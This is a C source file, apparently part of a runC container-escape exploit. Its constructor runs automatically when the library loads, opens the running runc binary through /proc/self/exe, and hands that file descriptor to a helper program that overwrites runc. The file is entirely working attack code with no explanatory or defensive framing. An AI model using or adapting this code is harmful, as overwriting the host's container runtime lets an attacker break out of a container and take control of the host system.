#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

__attribute__((constructor)) void trigger_on_load(void)
{
    char *args[3];
    char path_buf[128];

    /* Try opening the current executable (runC binary) */
    int exe_fd = open("/proc/self/exe", O_RDONLY);
    if (exe_fd == -1) {
        printf("[!] Failed to read /proc/self/exe\n");
        return;
    }
    printf("[+] /proc/self/exe opened using fd %d\n", exe_fd);
    fflush(stdout);

    /* Build argument list for overwrite_runc */
    args[0] = strdup("/overwrite");
    snprintf(path_buf, sizeof(path_buf), "/proc/self/fd/%d", exe_fd);
    args[1] = path_buf;
    args[2] = NULL;

    printf("[+] Overwriting runc\n");
    fflush(stdout);

    /* Replace current process with overwrite_runc */
    execve("/overwrite", args, NULL);
}

